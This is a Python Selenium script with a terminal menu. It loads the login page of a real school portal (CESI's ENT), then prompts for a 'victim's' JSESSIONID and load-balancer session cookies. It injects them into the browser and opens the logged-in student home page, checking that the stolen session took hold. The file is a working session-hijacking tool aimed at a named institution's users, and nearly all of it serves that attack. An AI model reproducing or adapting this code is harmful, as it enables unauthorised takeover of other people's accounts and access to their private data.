from selenium import webdriver
from webdriver_manager.chrome import ChromeDriverManager
import sys




class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'


prompt = f"\n{bcolors.OKCYAN}>>> {bcolors.ENDC}"
help_msg =  f" - Enter {bcolors.OKCYAN}load{bcolors.ENDC} to load page\n"
help_msg += f" - Enter {bcolors.OKCYAN}ent{bcolors.ENDC} to load the ent\n"
help_msg += f" - Enter {bcolors.OKCYAN}get_cookies{bcolors.ENDC} to get the current cookies from the browser page\n"
help_msg += f" - Enter {bcolors.OKCYAN}set_cookies{bcolors.ENDC} to set the cookies\n"
help_msg += f" - Enter {bcolors.OKCYAN}reload{bcolors.ENDC} to reload the page\n"
help_msg += f" - Enter {bcolors.OKCYAN}exit{bcolors.ENDC} to exit the program\n"


def terminal_print(mess:str):
    print(f"{mess}{bcolors.ENDC}")


# ent_cookies = [
#     {
#         'domain': 'wayf.cesi.fr',
#         'httpOnly': True,
#         'name': 'BIGipServer~ADMIN~pool-WAYF-https',
#         'path': '/',
#         'sameSite': 'Lax',
#         'secure': True,
#         'value': ''
#     },
#     {
#         'domain': 'wayf.cesi.fr',
#         'httpOnly': True,
#         'name': 'JSESSIONID',
#         'path': '/',
#         'sameSite': 'Lax',
#         'secure': True,
#         'value': ''
#     },
#     {
#         'domain': '.wayf.cesi.fr',
#         'expiry': 1738758386,
#         'httpOnly': False,
#         'name': '_pk_id.9.5fe9',
#         'path': '/',
#         'sameSite': 'Lax',
#         'secure': True,
#         'value': ''
#     },
#     {
#         'domain': '.wayf.cesi.fr',
#         'expiry': 1704804986,
#         'httpOnly': False,
#         'name': '_pk_ses.9.5fe9',
#         'path': '/',
#         'sameSite': 'Lax',
#         'secure': True,
#         'value': ''
#     },
#     {
#         'domain': '.wayf.cesi.fr',
#         'expiry': 1738758386,
#         'httpOnly': False,
#         'name': '_pk_id.9.5fe9',
#         'path': '/',
#         'sameSite': 'Lax',
#         'secure': True,
#         'value': ''
#     },
#     {
#         'domain': '.wayf.cesi.fr',
#         'expiry': 1704804986,
#         'httpOnly': False,
#         'name': '_pk_ses.9.5fe9',
#         'path': '/',
#         'sameSite': 'Lax',
#         'secure': True,
#         'value': ''
#     }
# ]




ent_url = "https://wayf.cesi.fr/login?service=https%3A%2F%2Fent.cesi.fr%2Fservlet%2Fcom.jsbsoft.jtf.core.SG%3FPROC%3DIDENTIFICATION_FRONT"
ent_accueil_url = "https://ent.cesi.fr/accueil-apprenant"


def get_cookies(driver: webdriver.Chrome):
    """Get the cookies from the browser page and print them in the terminal"""
    cookies = driver.get_cookies()
    terminal_print(f"\n{bcolors.HEADER}Cookies : ")
    for cookie in cookies:
        terminal_print(f"\t{bcolors.WARNING}{cookie['name']}{bcolors.ENDC} : {bcolors.OKBLUE}{cookie['value']}")


def set_cookies(driver: webdriver.Chrome):
    """Set the cookies from the browser page and print them in the terminal"""
    terminal_print(f"{bcolors.HEADER}please enter victim's cookies : ")

    JSESSIONID = input(f"JSESSIONID :{prompt}").replace(' ', '')
    BIGipServer = input(f"\nBIGipServer~ADMIN~pool-WAYF-https :{prompt}").replace(' ', '')

    terminal_print(f"\n🔁 | {bcolors.OKBLUE}Setting cookies...\n")

    JSESSIONID_cookie = {
        'name': 'JSESSIONID',
        'value': JSESSIONID
    }
    BIGipServer_cookie = {
        'name': 'BIGipServer~ADMIN~pool-WAYF-https',
        'value': BIGipServer
    }


    old_cookies = driver.get_cookies()
    driver.delete_all_cookies()

    terminal_print(f"🔁 | {bcolors.OKCYAN}loading ent page...")
    driver.get(ent_url)

    terminal_print(f"🔁 | {bcolors.OKCYAN}adding cookies...")
    driver.add_cookie(JSESSIONID_cookie)
    driver.add_cookie(BIGipServer_cookie)

    terminal_print(f"🔁 | {bcolors.OKCYAN}reloading ent accueil page...")
    driver.get(ent_accueil_url)


    #check if cookies are set
    cookies = driver.get_cookies()
    for cookie in cookies:
        if cookie['name'] == 'JSESSIONID':
            if cookie['value'] != JSESSIONID:
                terminal_print(f"\n❌ | {bcolors.FAIL}Error while setting cookies JSESSIONID : {bcolors.OKBLUE}{cookie['value']} {bcolors.FAIL}should be {bcolors.OKBLUE}{JSESSIONID}")
            else:
                terminal_print(f"\n✅ | {bcolors.OKGREEN}Cookies JSESSIONID set !")

        elif cookie['name'] == 'BIGipServer~ADMIN~pool-WAYF-https':
            if cookie['value'] != BIGipServer:
                terminal_print(f"\n❌ | {bcolors.FAIL}Error while setting cookies BIGipServer : {bcolors.OKBLUE}{cookie['value']} {bcolors.FAIL}should be {bcolors.OKBLUE}{BIGipServer}")
            else:
                terminal_print(f"\n✅ | {bcolors.OKGREEN}Cookies BIGipServer set !")

    get_cookies(driver)
            
    return driver



if __name__ == "__main__":
    terminal_print(f"🚀 | {bcolors.HEADER}Launching browser...")
    driver = webdriver.Chrome(ChromeDriverManager().install())
    while True:
        input_ = input(f"\n{help_msg}\n{prompt}").lower()
        
        if input_.startswith('load'):
            url = input_.replace('load', '')
            try:
                url = url.split(' ')[1]
                driver.get(url.replace(' ', ''))
                terminal_print(f"✅ | {bcolors.OKGREEN}Page {url} loaded !")
            except Exception as e:
                #if error is indedx error
                if str(e).startswith('list index out of range'):
                    terminal_print(f"❌ | {bcolors.FAIL}Error while loading page {url} : No url provided !")
                elif "https://" not in url:
                    terminal_print(f"❌ | {bcolors.FAIL}Error while loading page {url} : Invalid url !")
                else:
                    terminal_print(f"❌ | {bcolors.FAIL}Error while loading page {url} : {e}")
                

        elif input_ == 'get_cookies':
            cookies = get_cookies(driver)

        elif input_ == 'set_cookies':
            driver = set_cookies(driver)
        
        elif input_ == 'exit':
            driver.quit()
            sys.exit()

        elif input_ == 'ent':
            driver.get(ent_url)

        elif input_ == 'reload':
            driver.refresh()

        else:
            terminal_print(f"❌ | {bcolors.WARNING}Unknown command !")

        print()
    